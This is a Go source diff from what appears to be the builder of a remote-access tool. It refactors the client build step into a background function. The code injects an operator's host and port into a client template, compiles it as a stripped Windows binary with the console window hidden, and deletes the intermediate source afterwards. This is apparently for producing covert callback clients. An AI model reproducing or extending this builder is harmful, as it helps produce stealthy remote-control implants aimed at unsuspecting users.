@@ -177,6 +177,44 @@ func handleClient(client *Connection) {
 	}
 }
 
+func build(host, port string) {
+	time.Sleep(time.Millisecond * 500)
+	Building.SetText(Building.Text + "[+] Building process initialised.\n")
+	data, err := os.ReadFile("lib/client.req")
+	if err != nil {
+		Building.SetText(Building.Text + "[-] Client code not found.\n\n")
+	} else {
+		os.Mkdir("build", 0644)
+		os.Chdir("build")
+		time.Sleep(time.Millisecond * 400)
+		Building.SetText(Building.Text + "[+] Client code successfully opened.\n")
+
+		code := strings.Replace(string(data), "<HOST>", host, 1)
+		code = strings.Replace(code, "<PORT>", port, 1)
+		time.Sleep(time.Millisecond * 600)
+		Building.SetText(Building.Text + "[+] HOST/PORT parameters injected.\n")
+		os.WriteFile("build.go", []byte(code), 0644)
+		Building.SetText(Building.Text + "[+] Client process closed.\n")
+		time.Sleep(time.Millisecond * 300)
+		Building.SetText(Building.Text + "[+] Golang compiler detected and ready.\n")
+		time.Sleep(time.Millisecond * 300)
+		Building.SetText(Building.Text + "[+] Compilation process started.\n")
+		exec.Command("go.exe", "mod", "init", "build").Run()
+		exec.Command("go.exe", "mod", "tidy").Run()
+		exec.Command("go.exe", "build", "--ldflags", "-s -H windowsgui", "build.go").Run()
+		Building.SetText(Building.Text + "[+] Compilation completed successfully.\n")
+		time.Sleep(time.Millisecond * 200)
+		Building.SetText(Building.Text + "[+] Cleanup in progress...\n")
+		os.Remove("go.mod")
+		os.Remove("go.sum")
+		os.Remove("build.go")
+		time.Sleep(time.Millisecond * 900)
+		Building.SetText(Building.Text + "[+] Build process completed successfully!\n\n")
+		exec.Command("explorer.exe", ".\\").Start()
+		os.Chdir("..")
+	}
+}
+
 func readAll(EOF string) string {
 	var LOG strings.Builder
 	for {
@@ -493,40 +531,7 @@ func main() {
 				port, err := strconv.Atoi(portEntry.Text)
 				Building.SetText("")
 				if strings.TrimSpace(hostEntry.Text) != "" && port > 0 && port < 65537 && err == nil {
-					Building.SetText(Building.Text + "[+] Building process initialised.\n")
-					data, err := os.ReadFile("lib/client.req")
-					if err != nil {
-						Building.SetText(Building.Text + "[-] Client code not found.\n\n")
-					} else {
-						os.Mkdir("build", 0644)
-						os.Chdir("build")
-						time.Sleep(time.Millisecond * 400)
-						Building.SetText(Building.Text + "[+] Client code successfully opened.\n")
-
-						code := strings.Replace(string(data), "<HOST>", hostEntry.Text, 1)
-						code = strings.Replace(code, "<PORT>", portEntry.Text, 1)
-						time.Sleep(time.Millisecond * 600)
-						Building.SetText(Building.Text + "[+] HOST/PORT parameters injected.\n")
-						os.WriteFile("build.go", []byte(code), 0644)
-						Building.SetText(Building.Text + "[+] Client process closed.\n")
-						time.Sleep(time.Millisecond * 300)
-						Building.SetText(Building.Text + "[+] Golang compiler detected and ready.\n")
-						time.Sleep(time.Millisecond * 300)
-						Building.SetText(Building.Text + "[+] Compilation process started.\n")
-						exec.Command("go.exe", "mod", "init", "build").Run()
-						exec.Command("go.exe", "mod", "tidy").Run()
-						exec.Command("go.exe", "build", "--ldflags", "-s -H windowsgui", "build.go").Run()
-						Building.SetText(Building.Text + "[+] Compilation completed successfully.\n")
-						time.Sleep(time.Millisecond * 200)
-						Building.SetText(Building.Text + "[+] Cleanup in progress...\n")
-						os.Remove("go.mod")
-						os.Remove("go.sum")
-						os.Remove("build.go")
-						time.Sleep(time.Millisecond * 900)
-						Building.SetText(Building.Text + "[+] Build process completed successfully!\n\n")
-						exec.Command("explorer.exe", ".\\").Start()
-						os.Chdir("..")
-					}
+					go build(hostEntry.Text, portEntry.Text)
 				} else {
 					Building.SetText(Building.Text + "[-] Failed to start the build due to invalid HOST/PORT parameters!\n\n")
 					dialog.NewError(errors.New("Invalid input detected!"), myWindow).Show()
